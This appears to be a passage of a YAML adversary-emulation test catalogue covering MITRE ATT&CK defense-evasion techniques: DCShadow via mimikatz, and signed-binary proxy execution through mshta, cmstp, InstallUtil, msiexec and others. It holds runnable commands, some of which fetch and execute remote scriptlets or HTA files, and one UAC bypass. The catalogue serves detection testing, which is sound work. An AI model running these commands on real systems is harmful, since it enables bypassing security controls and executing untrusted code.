        $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
        $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c 'PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam"

        # wait for fake DC server to be ready...
        Start-Sleep -Seconds 5

        # server ready, so trigger replication (push) and wait until it finished
        & "PathToAtomicsFolder\..\ExternalPayloads\mimikatz\x64\mimikatz.exe" "lsadump::dcshadow /push" "exit"

        Write-Host "`nWaiting for fake DC server to return"
        Wait-Process $dc

        Write-Host "`nOutput from fake DC server:"
        Get-Content $dc_output_file
        Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
        Remove-Item $dc_output_file -ErrorAction Ignore

        Write-Host "End of DCShadow"
      cleanup: Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
      timeout: 120
      elevation_required: true
  references:
    - https://attack.mitre.org/techniques/T1207
  is_safe: false
- id: T1216
  name: System Script Proxy Execution
  description: 'Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: SyncAppvPublishingServer Signed Script PowerShell Command Execution
      type: cmd
      platform: windows
      command: C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"
      timeout: 120
    - name: manage-bde.wsf Signed Script Command Execution
      type: cmd
      platform: windows
      command: |-
        set comspec=%windir%\System32\calc.exe
        cscript %windir%\System32\manage-bde.wsf
      cleanup: set comspec=%windir%\System32\cmd.exe
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1216
  is_safe: false
- id: T1216.001
  name: PubPrn
  description: 'Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a [Visual Basic](https://attack.mitre.org/techniques/T1059/005) script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the [Windows Command Shell](https://attack.mitre.org/techniques/T1059/003) via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Pr...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: PubPrn.vbs Signed Script Bypass
      type: cmd
      platform: windows
      command: cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost "script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1216.001/src/T1216.001.sct"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1216/001
  is_safe: false
- id: T1218
  name: System Binary Proxy Execution
  description: 'Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system.(Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Micr...'
  tactic: defense-evasion
  platforms:
    - windows
    - linux
    - macos
  executors:
    - name: mavinject - Inject DLL into running process
      type: cmd
      platform: windows
      command: mavinject.exe 1000 /INJECTRUNNING "PathToAtomicsFolder\T1218\src\x64\T1218.dll"
      timeout: 120
      elevation_required: true
    - name: Register-CimProvider - Execute evil dll
      type: cmd
      platform: windows
      command: C:\Windows\SysWow64\Register-CimProvider.exe -Path "PathToAtomicsFolder\T1218\src\Win32\T1218-2.dll"
      timeout: 120
    - name: InfDefaultInstall.exe .inf Execution
      type: cmd
      platform: windows
      command: InfDefaultInstall.exe "PathToAtomicsFolder\T1218\src\Infdefaultinstall.inf"
      timeout: 120
    - name: ProtocolHandler.exe Downloaded a Suspicious File
      type: cmd
      platform: windows
      command: |-
        FOR /F "tokens=2*" %a in ('reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\Winword.exe" /V PATH') do set microsoft_wordpath=%b
        call "%microsoft_wordpath%\protocolhandler.exe" "ms-word:nft|u|https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218/src/T1218Test.docx"
      timeout: 120
    - name: Microsoft.Workflow.Compiler.exe Payload Execution
      type: powershell
      platform: windows
      command: C:\Windows\Microsoft.NET\Framework64\v4.0.30319\microsoft.workflow.compiler.exe "PathToAtomicsFolder\T1218\src\T1218.xml" output.txt
      timeout: 120
    - name: Renamed Microsoft.Workflow.Compiler.exe Payload Executions
      type: powershell
      platform: windows
      command: '&"PathToAtomicsFolder\..\ExternalPayloads\svchost.exe" "PathToAtomicsFolder\T1218\src\T1218.xml" output.txt'
      timeout: 120
    - name: Invoke-ATHRemoteFXvGPUDisablementCommand base test
      type: powershell
      platform: windows
      command: Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName foo -ModulePath $PWD
      timeout: 120
    - name: DiskShadow Command Execution
      type: powershell
      platform: windows
      command: C:\Windows\System32\diskshadow.exe -S PathToAtomicsFolder\T1218\src\T1218.txt
      timeout: 120
    - name: Load Arbitrary DLL via Wuauclt (Windows Update Client)
      type: cmd
      platform: windows
      command: wuauclt.exe /UpdateDeploymentProvider "PathToAtomicsFolder\T1218\bin\calc.dll" /RunHandlerComServer
      cleanup: taskkill /f /im calculator.exe > nul 2>&1
      timeout: 120
    - name: Lolbin Gpscript logon option
      type: cmd
      platform: windows
      command: Gpscript /logon
      timeout: 120
    - name: Lolbin Gpscript startup option
      type: cmd
      platform: windows
      command: Gpscript /startup
      timeout: 120
    - name: Lolbas ie4uinit.exe use as proxy
      type: cmd
      platform: windows
      command: |-
        copy c:\windows\system32\ie4uinit.exe %TEMP%\ie4uinit.exe
        copy "PathToAtomicsFolder\T1218\src\ieuinit.inf" %TEMP%\ieuinit.inf
        %TEMP%\ie4uinit.exe -BaseSettings
      cleanup: |-
        del %TEMP%\ie4uinit.exe >nul 2>&1
        del %TEMP%\ieuinit.inf >nul 2>&1
      timeout: 120
    - name: LOLBAS CustomShellHost to Spawn Process
      type: powershell
      platform: windows
      command: |-
        if (-not (Test-Path C:\test)) {
        New-Item -Path C:\test -ItemType Directory
        } else {
        Write-Host "Directory C:\test already exists." }
        Copy-Item -Path "C:\windows\system32\customshellhost.exe" -Destination "C:\test\customshellhost.exe" -Force
        Copy-Item -Path "C:\windows\system32\calc.exe" -Destination "C:\test\explorer.exe" -Force
        C:\test\customshellhost.exe
      cleanup: Remove-Item -Path C:\test -Recurse -Force
      timeout: 120
      elevation_required: true
    - name: Provlaunch.exe Executes Arbitrary Command via Registry Key
      type: cmd
      platform: windows
      command: |-
        reg.exe add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1 /v altitude /t REG_DWORD /d 0
        reg add HKLM\SOFTWARE\Microsoft\Provisioning\Commands\LOLBin\dummy1\dummy2 /v Commandline /d calc.exe
        c:\windows\system32\provlaunch.exe LOLBin
      timeout: 120
    - name: LOLBAS Msedge to Spawn Process
      type: powershell
      platform: windows
      command: |-
        $edgePath64 = "C:\Program Files\Microsoft\Edge\Application\msedge.exe"
        if (Test-Path $edgePath64) {
            $edgePath = $edgePath64
        } else {
            # Check 32-bit Edge installation path
            $edgePath32 = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
            if (Test-Path $edgePath32) {
                $edgePath = $edgePath32
            } else {
                exit 1
            }
        }
        & $edgePath --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&"
        sleep 5
        taskkill -f -im msedge.exe
        taskkill -f -im calc.exe
        taskkill -f -im win32calc.exe
      timeout: 120
    - name: System Binary Proxy Execution - Wlrmdr Lolbin
      type: powershell
      platform: windows
      command: wlrmdr.exe -s 3600 -f 0 -t _ -m _ -a 11 -u "C:\Windows\System32\calc.exe"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218
  is_safe: false
- id: T1218.001
  name: Compiled HTML File
  description: 'Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) load...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Compiled HTML Help Local Payload
      type: cmd
      platform: windows
      command: hh.exe "PathToAtomicsFolder\T1218.001\src\T1218.001.chm"
      timeout: 120
    - name: Compiled HTML Help Remote Payload
      type: cmd
      platform: windows
      command: hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
      timeout: 120
    - name: Invoke CHM with default Shortcut Command Execution
      type: powershell
      platform: windows
      command: Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm
      timeout: 120
    - name: Invoke CHM with InfoTech Storage Protocol Handler
      type: powershell
      platform: windows
      command: Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm
      timeout: 120
    - name: Invoke CHM Simulate Double click
      type: powershell
      platform: windows
      command: Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm
      timeout: 120
    - name: Invoke CHM with Script Engine and Help Topic
      type: powershell
      platform: windows
      command: Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm
      timeout: 120
    - name: Invoke CHM Shortcut Command with ITS and Help Topic
      type: powershell
      platform: windows
      command: Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension html -HHFilePath $env:windir\hh.exe -CHMFilePath Test.chm
      timeout: 120
    - name: Decompile Local CHM File
      type: cmd
      platform: windows
      command: hh.exe -decompile %temp% "PathToAtomicsFolder\T1218.001\src\T1218.001.chm"
      cleanup: del %temp%\T1218.001.html >nul 2>&1
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/001
  is_safe: false
- id: T1218.002
  name: Control Panel
  description: |-
    Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

    Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, the latter are actually renamed dynamic-link library (.dll) files that export a <code>CPlApplet</code> function.(Citation: Microsoft Implementing CPL)(Citation: TrendM...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Control Panel Items
      type: cmd
      platform: windows
      command: control.exe "PathToAtomicsFolder\T1218.002\bin\calc.cpl"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/002
  is_safe: false
- id: T1218.003
  name: CMSTP
  description: |-
    Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMSTP.exe) is a command-line program used to install Connection Manager service profiles. (Citation: Microsoft Connection Manager Oct 2009) CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote access connections.

    Adversaries may supply CMSTP.exe with INF files infected with malicious commands. (Citation: Twit...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: CMSTP Executing Remote Scriptlet
      type: cmd
      platform: windows
      command: cmstp.exe /s "PathToAtomicsFolder\T1218.003\src\T1218.003.inf"
      timeout: 120
    - name: CMSTP Executing UAC Bypass
      type: cmd
      platform: windows
      command: cmstp.exe /s "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf" /au
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/003
  is_safe: false
- id: T1218.004
  name: InstallUtil
  description: 'Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil binary may also be digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> and <code>...'
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: CheckIfInstallable method call
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $ExpectedOutput = 'Constructor_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'CheckIfInstallable'
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        CheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallHelper method call
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'InstallHelper'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallHelper method execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil class constructor method call
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/logfile= /logtoconsole=false `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil Install method call
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=install `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_Install_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil Uninstall method call - /U variant
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/logfile= /logtoconsole=false /U `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_Uninstall_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil Uninstall method call - '/installtype=notransaction /action=uninstall' variant
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_Uninstall_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil HelpText method call
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "/? `"$InstallerAssemblyFullPath`""
        $ExpectedOutput = 'Constructor_HelpText_'

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        InstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        $InstallerAssemblyDir = "$Env:TEMP\"
        $InstallerAssemblyFileName = "T1218.004.dll"
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName
        Remove-Item -Path $InstallerAssemblyFullPath -ErrorAction Ignore
      timeout: 120
    - name: InstallUtil evasive invocation
      type: powershell
      platform: windows
      command: |-
        # Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly
        . "PathToAtomicsFolder\T1218.004\src\InstallUtilTestHarness.ps1"

        $InstallerAssemblyDir = "$Env:windir\System32\Tasks"
        $InstallerAssemblyFileName = 'readme.txt'
        $InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName

        $CommandLine = "readme.txt"
        $ExpectedOutput = 'Constructor_'

        # Explicitly set the directory so that a relative path to readme.txt can be supplied.
        Set-Location "$Env:windir\System32\Tasks"

        Copy-Item -Path "$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe" -Destination "$Env:windir\System32\Tasks\notepad.exe"

        $TestArgs = @{
            OutputAssemblyDirectory = $InstallerAssemblyDir
            OutputAssemblyFileName = $InstallerAssemblyFileName
            InvocationMethod = 'Executable'
            CommandLine = $CommandLine
            InstallUtilPath = "$Env:windir\System32\Tasks\notepad.exe"
        }

        $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly

        if ($ActualOutput -ne $ExpectedOutput) {
            throw @"
        Evasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.
        Expected: $ExpectedOutput
        Actual: $ActualOutput
        "@
        }
      cleanup: |-
        Remove-Item -Path "$Env:windir\System32\Tasks\readme.txt" -ErrorAction Ignore
        Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallLog" -ErrorAction Ignore
        Remove-Item -Path "$Env:windir\System32\Tasks\readme.InstallState" -ErrorAction Ignore
        Remove-Item -Path "$Env:windir\System32\Tasks\notepad.exe" -ErrorAction Ignore
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/004
  is_safe: false
- id: T1218.005
  name: Mshta
  description: "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Part Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) \n\nMshta.exe is a utility that execut..."
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Mshta executes JavaScript Scheme Fetch Remote Payload With GetObject
      type: cmd
      platform: windows
      command: mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();
      timeout: 120
    - name: Mshta executes VBScript to execute malicious command
      type: cmd
      platform: windows
      command: mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"":close")
      timeout: 120
    - name: Mshta Executes Remote HTML Application (HTA)
      type: powershell
      platform: windows
      command: |-
        $var =Invoke-WebRequest "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.hta"
        $var.content|out-file "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
        mshta "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta"
        start-sleep -s 15
        stop-process -name "calculator" -Force -ErrorAction Ignore
        stop-process -name "CalculatorApp" -Force -ErrorAction Ignore
      cleanup: remove-item "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\T1218.005.hta" -ErrorAction Ignore
      timeout: 120
    - name: Invoke HTML Application - Jscript Engine over Local UNC Simulating Lateral Movement
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -AsLocalUNCPath -SimulateLateralMovement -MSHTAFilePath $env:windir\system32\mshta.exe
      timeout: 120
    - name: Invoke HTML Application - Jscript Engine Simulating Double Click
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -HTAFilePath Test.hta -ScriptEngine JScript -SimulateUserDoubleClick
      timeout: 120
    - name: Invoke HTML Application - Direct download from URI
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -HTAUri https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta -MSHTAFilePath $env:windir\system32\mshta.exe
      timeout: 120
    - name: Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -UseRundll32 -Rundll32FilePath $env:windir\system32\rundll32.exe
      timeout: 120
    - name: Invoke HTML Application - JScript Engine with Inline Protocol Handler
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe
      timeout: 120
    - name: Invoke HTML Application - Simulate Lateral Movement over UNC Path
      type: powershell
      platform: windows
      command: Invoke-ATHHTMLApplication -TemplatePE -AsLocalUNCPath -MSHTAFilePath $env:windir\system32\mshta.exe
      timeout: 120
    - name: Mshta used to Execute PowerShell
      type: cmd
      platform: windows
      command: mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20Hello,%20MSHTA!;Start-Sleep%20-Seconds%205"""))</script>'"
      timeout: 120
  references:
    - https://attack.mitre.org/techniques/T1218/005
  is_safe: false
- id: T1218.007
  name: Msiexec
  description: |-
    Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi).(Citation: Microsoft msiexec) The Msiexec.exe binary may also be digitally signed by Microsoft.

    Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs.(Citation: LOLBAS Msiexec)(Citation: TrendMicro Msiexec Feb 2018) Si...
  tactic: defense-evasion
  platforms:
    - windows
  executors:
    - name: Msiexec.exe - Execute Local MSI file with embedded JScript
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /q /i "PathToAtomicsFolder\T1218.007\bin\T1218.007_JScript.msi"
      timeout: 120
    - name: Msiexec.exe - Execute Local MSI file with embedded VBScript
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /q /i "PathToAtomicsFolder\T1218.007\bin\T1218.007_VBScript.msi"
      timeout: 120
    - name: Msiexec.exe - Execute Local MSI file with an embedded DLL
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /q /i "PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi"
      timeout: 120
    - name: Msiexec.exe - Execute Local MSI file with an embedded EXE
      type: cmd
      platform: windows
      command: c:\windows\system32\msiexec.exe /q /i "PathToAtomicsFolder\T1218.007\bin\T1218.007_EXE.msi"
      timeout: 120
    - name: WMI Win32_Product Class - Execute Local MSI file with embedded JScript
      type: powershell
      platform: windows
      command: Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\T1218.007\bin\T1218.007_JScript.msi' }
      timeout: 120
    - name: WMI Win32_Product Class - Execute Local MSI file with embedded VBScript
      type: powershell
      platform: windows
      command: Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\T1218.007\bin\T1218.007_VBScript.msi' }
      timeout: 120
    - name: WMI Win32_Product Class - Execute Local MSI file with an embedded DLL
      type: powershell
      platform: windows
      command: Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'PathToAtomicsFolder\T1218.007\bin\T1218.007_DLL.msi' }
      timeout: 120
    - name: WMI Win32_Product Class - Execute Local MSI file with an embedded EXE
      type: powershell
      platform: windows
